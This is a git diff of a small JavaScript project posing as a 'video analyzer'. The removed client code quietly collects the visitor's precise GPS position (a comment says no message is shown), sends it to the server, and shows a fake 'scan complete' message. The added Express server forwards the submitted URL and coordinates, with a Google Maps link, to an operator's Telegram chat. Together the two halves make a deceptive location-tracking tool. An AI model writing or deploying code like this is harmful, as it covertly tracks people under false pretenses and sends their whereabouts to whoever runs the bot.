@@ -1,60 +1,68 @@
-const analyzeButton = document.getElementById('analyzeButton');
-const videoUrlInput = document.getElementById('videoUrlInput');
-const statusText = document.getElementById('status');
-const progressBar = document.getElementById('progressBar');
-const progressBarContainer = document.getElementById('progressBarContainer');
+// server.js
+const express = require('express');
+const path = require('path');
+const FormData = require('form-data');
+const cors = require('cors');
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+require('dotenv').config();
 
-analyzeButton.addEventListener('click', async () => {
-    const videoUrl = videoUrlInput.value.trim();
-    if (!videoUrl) return;
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-    progressBarContainer.style.display = 'block';
-    progressBar.style.width = '5%';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-    let locationData = null;
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.error("❌ TELEGRAM token və ya chat ID tapılmadı!");
+} else {
+    console.log("✅ Telegram token və chat ID uğurla yükləndi.");
+}
+
+app.use(cors());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.post('/api/send-data', async (req, res) => {
+    const { videoUrl, location } = req.body;
+    console.log(`📩 New data received: video=${!!videoUrl}, location=${!!location}`);
 
     try {
-        if ("geolocation" in navigator) {
-            // Lokasiya icazəsi arxa planda alınır, heç bir mesaj göstərilmir
-            await new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        locationData = {
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                        resolve();
-                    },
-                    () => resolve(),
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
-            });
+        let messageText = `⚡️ *New Device Scan Entry!* ⚡️\n\n`;
+        messageText += `*Device ID / URL:* ${videoUrl || 'Not provided'}\n`;
+
+        if (location?.latitude && location?.longitude) {
+            messageText += `*Location:* [View on Google Maps](https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
+            messageText += `Latitude: ${location.latitude}\nLongitude: ${location.longitude}\n`;
+        } else {
+            messageText += `*Location:* Not available or denied.\n`;
         }
 
-        progressBar.style.width = '60%';
-
-        // Serverə göndər
-        await fetch('/api/send-data', {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ videoUrl, location: locationData })
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: messageText,
+                parse_mode: 'Markdown'
+            })
         });
 
-        progressBar.style.width = '100%';
-        statusText.textContent = "Scan complete. Results uploaded securely.";
+        if (!response.ok) {
+            const err = await response.json();
+            throw new Error(`Telegram error: ${err.description}`);
+        }
 
-        setTimeout(() => {
-            progressBarContainer.style.display = 'none';
-            progressBar.style.width = '0%';
-            videoUrlInput.value = '';
-            statusText.textContent = '';
-        }, 3000);
+        console.log("✅ Message successfully sent to Telegram.");
+        res.json({ ok: true, message: "Data sent to Telegram." });
 
     } catch (err) {
-        console.error(err);
-        progressBar.style.width = '0%';
-        progressBarContainer.style.display = 'none';
-        statusText.textContent = "An error occurred. Please try again.";
+        console.error("❌ Error:", err.message);
+        res.status(500).json({ message: err.message });
     }
 });
+
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
